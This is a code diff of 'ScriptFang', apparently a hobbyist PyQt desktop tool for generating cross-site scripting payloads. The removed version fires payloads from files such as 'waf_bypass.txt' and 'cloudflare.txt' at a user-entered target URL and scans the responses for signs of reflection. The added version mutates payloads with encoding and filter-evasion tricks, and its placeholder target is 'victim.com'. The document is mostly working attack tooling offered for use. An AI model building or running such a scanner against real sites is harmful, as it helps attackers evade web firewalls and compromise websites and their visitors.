@@ -1,349 +1,110 @@
-from PyQt6.QtWidgets import (
-    QApplication, QLabel, QWidget, QPushButton, QTextEdit, QLineEdit
-)
-from PyQt6.QtGui import QMovie, QFont, QTextCursor
-from PyQt6.QtCore import Qt, QSize
 import sys
 import os
 import random
-import re
-import requests
+from PyQt5.QtWidgets import (
+    QApplication, QWidget, QLabel, QVBoxLayout,
+    QPushButton, QTextEdit, QLineEdit, QFileDialog,
+    QHBoxLayout, QComboBox
+)
+from PyQt5.QtGui import QMovie, QFont
+from PyQt5.QtCore import Qt
 
+def load_payloads():
+    try:
+        with open("payloads/xss.txt", "r") as f:
+            return [line.strip() for line in f if line.strip()]
+    except FileNotFoundError:
+        return ["<script>alert('XSS');</script>"]
+
+def mutate_payload(payload):
+    variants = [
+        payload.replace("<", "%3C"),
+        payload.replace("script", "scr<script>ipt"),
+        payload.replace("alert", "alert"),
+        ''.join(random.choice([c.upper(), c.lower()]) for c in payload),
+        payload.replace("=", "%3D")
+    ]
+    return random.choice(variants)
+
+def generate_waf_bypass(payload):
+    tricks = [
+        payload.replace("<", "<svg><script>"),
+        payload.replace("script", "scr\\u0069pt"),
+        payload.replace("=", "&#x3D;"),
+        payload.replace("alert", "eval`alert(1)`")
+    ]
+    return random.choice(tricks)
 
 class ScriptFangGUI(QWidget):
     def __init__(self):
         super().__init__()
         self.setWindowTitle("ScriptFang")
-        self.setFixedSize(1024, 600)  # Resized window
+        self.setFixedSize(1024, 600)
 
-        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-        self.payload_dir = os.path.join(base_dir, "tools", "payloads")
+        self.background_label = QLabel(self)
+        self.movie = QMovie("assets/dragons.gif")
+        self.background_label.setMovie(self.movie)
+        self.movie.start()
+        self.background_label.setScaledContents(True)
+        self.background_label.setGeometry(0, 0, 1024, 600)
 
-        gif_path = os.path.join(base_dir, "assets", "dragons.gif")
-        print("Resolved GIF path:", gif_path)
+        layout = QVBoxLayout(self)
+        layout.setContentsMargins(20, 20, 20, 20)
 
-        # Background GIF label
-        self.bg_label = QLabel(self)
-        self.bg_label.setGeometry(0, 0, self.width(), self.height())
-        self.bg_label.setStyleSheet("background: black;")
-        self.bg_label.lower()
+        self.title = QLabel("ScriptFang")
+        self.title.setFont(QFont("Courier", 36))
+        self.title.setStyleSheet("color: #00ff00")
+        self.title.setAlignment(Qt.AlignCenter)
 
-        self.movie = QMovie(gif_path)
-        if not self.movie.isValid():
-            print(f"❌ Failed to load GIF from {gif_path}")
-            self.bg_label.setText("Failed to load GIF")
-            self.bg_label.setStyleSheet("color: red; background: black; font-size: 24px;")
-        else:
-            self.movie.setCacheMode(QMovie.CacheMode.CacheAll)
-            self.movie.setSpeed(100)
-            self.movie.setScaledSize(QSize(self.width(), self.height()))
-            self.bg_label.setMovie(self.movie)
-            self.movie.start()
+        self.target_input = QLineEdit()
+        self.target_input.setPlaceholderText("Enter target URL (e.g., https://victim.com/search?q=)")
+        self.target_input.setStyleSheet("background-color: rgba(0,0,0,0.6); color: #00ff00; font-size: 14px; border: 2px solid #00ff00; border-radius: 10px;")
+        self.target_input.setFixedHeight(35)
 
-        # Title
-        self.title = QLabel("SCRIPTFANG", self)
-        self.title.setStyleSheet("color: #00ff00; background: transparent;")
-        self.title.setFont(QFont("Courier", 45, QFont.Weight.Bold))
-        self.title.setAlignment(Qt.AlignmentFlag.AlignCenter)
-        self.title.setGeometry(0, 20, self.width(), 50)
+        self.mode_selector = QComboBox()
+        self.mode_selector.addItems(["Normal", "Mutate", "WAF Bypass"])
+        self.mode_selector.setStyleSheet("background-color: black; color: #00ff00")
 
-        # Target URL input - centered horizontally
-        self.url_input = QLineEdit(self)
-        self.url_input.setPlaceholderText("Enter target URL (e.g. https://victim.com/search?q=)")
-        input_width = 600
-        input_height = 35
-        self.url_input.setGeometry(
-            (self.width() - input_width) // 2,
-            90,
-            input_width,
-            input_height
-        )
-        self.url_input.setStyleSheet(
-            "background-color: rgba(0,0,0,0.6); color: #00ff00; font-size: 14px; border: 2px solid #00ff00; border-radius: 10px;"
-        )
-        self.url_input.setFont(QFont("Courier", 12))
+        self.output_area = QTextEdit()
+        self.output_area.setReadOnly(True)
+        self.output_area.setStyleSheet("background-color: rgba(0, 0, 0, 0.6); color: #00ff00; font-size: 14px; border: 2px solid #00ff00; border-radius: 10px;")
+        self.output_area.setFixedHeight(120)
 
-        # Payload output box - centered horizontally
-        output_width = 700
-        output_height = 110
-        self.output = QTextEdit(self)
-        self.output.setGeometry(
-            (self.width() - output_width) // 2,
-            150,
-            output_width,
-            output_height
-        )
-        self.output.setReadOnly(True)
-        self.output.setStyleSheet(
-            "background-color: rgba(0, 0, 0, 0.6); color: #00ff00; font-size: 14px; border: 2px solid #00ff00; border-radius: 10px;"
-        )
-        self.output.setFont(QFont("Courier", 12))
-        self.output.setText("// XSS Payload will appear here\n")
+        self.generate_button = QPushButton("Generate Payload")
+        self.generate_button.clicked.connect(self.generate_payload)
+        self.generate_button.setStyleSheet("background-color: rgba(0,100,0,0.7); color: white; font-size: 15px; border-radius: 8px;")
+        self.generate_button.setFixedHeight(40)
 
-        # Feedback label - centered horizontally
-        self.feedback = QLabel("", self)
-        self.feedback.setGeometry(
-            0,
-            270,
-            self.width(),
-            30
-        )
-        self.feedback.setStyleSheet("color: #00ff00; background: transparent; font-size: 14px;")
-        self.feedback.setAlignment(Qt.AlignmentFlag.AlignCenter)
+        button_layout = QHBoxLayout()
+        button_layout.addWidget(self.generate_button)
+        button_layout.addWidget(self.mode_selector)
 
-        # Buttons config: (label, file_name)
-        self.payload_buttons = [
-            ("XSS Payload", "xss.txt"),
-            ("WAF Bypass", "waf_bypass.txt"),
-            ("Angular Payload", "angular.txt"),
-            ("href Payload", "href.txt"),
-            ("Script Breakout", "script_breakout.txt"),
-            ("ScriptSneaky", "scriptsneaky.txt"),
-            ("Body Payload", "body.txt"),
-            ("Div Payload", "div.txt"),
-            ("Cloudflare Bypass", "cloudflare.txt")
-        ]
+        self.credit = QLabel("Made by Talyx | GitHub: Talyx66")
+        self.credit.setStyleSheet("color: #00ff00")
+        self.credit.setAlignment(Qt.AlignCenter)
 
-        self.buttons = {}
-        btn_width = 140
-        btn_height = 35
-        spacing = 15
-        buttons_per_row = 4
+        layout.addWidget(self.title)
+        layout.addWidget(self.target_input)
+        layout.addLayout(button_layout)
+        layout.addWidget(self.output_area)
+        layout.addWidget(self.credit)
 
-        # Starting positions for button grid
-        start_x = (self.width() - (btn_width * buttons_per_row + spacing * (buttons_per_row - 1))) // 2
-        start_y = 320
+        self.setLayout(layout)
 
-        # Create first row buttons
-        for idx, (label, filename) in enumerate(self.payload_buttons[:buttons_per_row]):
-            x = start_x + idx * (btn_width + spacing)
-            btn = QPushButton(label, self)
-            btn.setGeometry(x, start_y, btn_width, btn_height)
-            btn.setStyleSheet(
-                "background-color: rgba(0,128,0,0.7); color: white; font-size: 13px; border-radius: 6px;"
-            )
-            btn.clicked.connect(lambda checked, f=filename: self.generate_payload_from_file(f))
-            self.buttons[label] = btn
+    def generate_payload(self):
+        payloads = load_payloads()
+        chosen = random.choice(payloads)
+        mode = self.mode_selector.currentText()
 
-        # Second row buttons
-        second_row_y = start_y + btn_height + 12
-        for idx, (label, filename) in enumerate(self.payload_buttons[buttons_per_row:buttons_per_row*2]):
-            x = start_x + idx * (btn_width + spacing)
-            btn = QPushButton(label, self)
-            btn.setGeometry(x, second_row_y, btn_width, btn_height)
-            btn.setStyleSheet(
-                "background-color: rgba(0,128,0,0.7); color: white; font-size: 13px; border-radius: 6px;"
-            )
-            btn.clicked.connect(lambda checked, f=filename: self.generate_payload_from_file(f))
-            self.buttons[label] = btn
+        if mode == "Mutate":
+            chosen = mutate_payload(chosen)
+        elif mode == "WAF Bypass":
+            chosen = generate_waf_bypass(chosen)
 
-        # Generate Multiple Payloads button centered below payload buttons
-        multi_btn_width = 200
-        multi_btn_height = 40
-        multi_btn_y = second_row_y + btn_height + 25
-        self.multi_button = QPushButton("Generate Multiple Payloads", self)
-        self.multi_button.setGeometry(
-            (self.width() - multi_btn_width) // 2,
-            multi_btn_y,
-            multi_btn_width,
-            multi_btn_height
-        )
-        self.multi_button.setStyleSheet(
-            "background-color: rgba(0,100,0,0.7); color: white; font-size: 15px; border-radius: 8px;"
-        )
-        self.multi_button.clicked.connect(self.generate_multiple_payloads)
-
-        # Test Payload button next to multi_button
-        test_btn_width = 140
-        test_btn_height = 40
-        test_btn_x = (self.width() + multi_btn_width) // 2 + 15
-        self.test_button = QPushButton("Test Payload", self)
-        self.test_button.setGeometry(
-            test_btn_x,
-            multi_btn_y,
-            test_btn_width,
-            test_btn_height
-        )
-        self.test_button.setStyleSheet(
-            "background-color: rgba(128,0,0,0.7); color: white; font-size: 15px; border-radius: 8px;"
-        )
-        self.test_button.clicked.connect(self.test_payload)
-
-        # Footer label (GitHub + credit) at the bottom center
-        footer_height = 25
-        self.footer = QLabel("GitHub: github.com/Talyx66  |  Made by Talyx", self)
-        self.footer.setStyleSheet("color: #00ff00; background: transparent;")
-        self.footer.setFont(QFont("Courier", 10))
-        self.footer.setAlignment(Qt.AlignmentFlag.AlignCenter)
-        self.footer.setGeometry(0, self.height() - footer_height, self.width(), footer_height)
-
-        # Store current payloads
-        self.current_payloads = []
-
-    def resizeEvent(self, event):
-        self.bg_label.setGeometry(0, 0, self.width(), self.height())
-        if self.movie and self.movie.isValid():
-            self.movie.setScaledSize(QSize(self.width(), self.height()))
-        # Re-center input, output, feedback, buttons, footer on resize
-        input_width = 600
-        output_width = 700
-        btn_width = 140
-        btn_height = 35
-        spacing = 15
-        buttons_per_row = 4
-
-        self.url_input.setGeometry(
-            (self.width() - input_width) // 2,
-            90,
-            input_width,
-            35
-        )
-        self.output.setGeometry(
-            (self.width() - output_width) // 2,
-            150,
-            output_width,
-            110
-        )
-        self.feedback.setGeometry(
-            0,
-            270,
-            self.width(),
-            30
-        )
-
-        start_x = (self.width() - (btn_width * buttons_per_row + spacing * (buttons_per_row - 1))) // 2
-        start_y = 320
-
-        for idx, label in enumerate(list(self.buttons.keys())[:buttons_per_row]):
-            x = start_x + idx * (btn_width + spacing)
-            self.buttons[label].setGeometry(x, start_y, btn_width, btn_height)
-
-        second_row_y = start_y + btn_height + 12
-        for idx, label in enumerate(list(self.buttons.keys())[buttons_per_row:buttons_per_row*2]):
-            x = start_x + idx * (btn_width + spacing)
-            self.buttons[label].setGeometry(x, second_row_y, btn_width, btn_height)
-
-        multi_btn_width = 200
-        multi_btn_height = 40
-        multi_btn_y = second_row_y + btn_height + 25
-        self.multi_button.setGeometry(
-            (self.width() - multi_btn_width) // 2,
-            multi_btn_y,
-            multi_btn_width,
-            multi_btn_height
-        )
-
-        test_btn_width = 140
-        test_btn_height = 40
-        test_btn_x = (self.width() + multi_btn_width) // 2 + 15
-        self.test_button.setGeometry(
-            test_btn_x,
-            multi_btn_y,
-            test_btn_width,
-            test_btn_height
-        )
-
-        footer_height = 25
-        self.footer.setGeometry(0, self.height() - footer_height, self.width(), footer_height)
-
-        super().resizeEvent(event)
-
-    def generate_payload_from_file(self, filename):
-        try:
-            path = os.path.join(self.payload_dir, filename)
-            with open(path, 'r', encoding='utf-8') as f:
-                payloads = [line.strip() for line in f if line.strip()]
-            if not payloads:
-                self.output.setPlainText(f"// No payloads found in {filename}.")
-                self.current_payloads = []
-                self.feedback.setText("")
-                return
-            payload = random.choice(payloads)
-            self.current_payloads = [payload]
-            self.output.setPlainText(payload)
-            cursor = self.output.textCursor()
-            cursor.movePosition(QTextCursor.MoveOperation.Start)
-            self.output.setTextCursor(cursor)
-            self.feedback.setText("")
-        except Exception as e:
-            self.output.setPlainText(f"⚠️ Error loading {filename}: {e}")
-            self.current_payloads = []
-            self.feedback.setText("")
-
-    def generate_multiple_payloads(self):
-        try:
-            path = os.path.join(self.payload_dir, "xss.txt")
-            with open(path, 'r', encoding='utf-8') as f:
-                payloads = [line.strip() for line in f if line.strip()]
-            if not payloads:
-                self.output.setPlainText("// No payloads found in xss.txt.")
-                self.current_payloads = []
-                self.feedback.setText("")
-                return
-            selected = random.sample(payloads, min(5, len(payloads)))
-            self.current_payloads = selected
-            self.output.setPlainText("\n\n".join(selected))
-            cursor = self.output.textCursor()
-            cursor.movePosition(QTextCursor.MoveOperation.Start)
-            self.output.setTextCursor(cursor)
-            self.feedback.setText("")
-        except Exception as e:
-            self.output.setPlainText(f"⚠️ Error loading xss.txt: {e}")
-            self.current_payloads = []
-            self.feedback.setText("")
-
-    def test_payload(self):
-        target_url = self.url_input.text().strip()
-        if not target_url:
-            self.feedback.setText("⚠️ Enter a valid target URL first.")
-            return
-        if not self.current_payloads:
-            self.feedback.setText("⚠️ Generate payload(s) first.")
-            return
-
-        self.feedback.setText("⏳ Testing payload(s) on target...")
-        self.repaint()  # Force UI update
-
-        results = []
-
-        for payload in self.current_payloads:
-            test_url = target_url + payload
-            try:
-                resp = requests.get(test_url, timeout=10)
-                content = resp.text
-
-                patterns = [
-                    re.escape(payload),
-                    r"(?i)<script>alert\(",
-                    r"(?i)onerror=",
-                    r"(?i)onload=",
-                    r"(?i)javascript:",
-                    r"(?i)document\.cookie",
-                ]
-
-                matched = any(re.search(pattern, content) for pattern in patterns)
-
-                if matched:
-                    results.append(f"✅ Payload reflected: {payload[:40]}...")
-                else:
-                    if resp.status_code in (403, 406):
-                        results.append(f"❌ Blocked (HTTP {resp.status_code}): {payload[:40]}...")
-                    elif resp.status_code >= 500:
-                        results.append(f"⚠️ Server error (HTTP {resp.status_code}): {payload[:40]}...")
-                    else:
-                        results.append(f"⚠️ No reflection (HTTP {resp.status_code}): {payload[:40]}...")
-
-            except requests.exceptions.Timeout:
-                results.append(f"❌ Timeout: {payload[:40]}...")
-            except requests.exceptions.RequestException as e:
-                results.append(f"❌ Request error: {e}")
-
-        self.feedback.setStyleSheet("color: #00ff00;" if any(r.startswith("✅") for r in results) else "color: #ffbb55;")
-        self.feedback.setText("\n".join(results))
-
+        self.output_area.setText(chosen)
 
 if __name__ == "__main__":
     app = QApplication(sys.argv)
     gui = ScriptFangGUI()
     gui.show()
-    sys.exit(app.exec())
+    sys.exit(app.exec_())
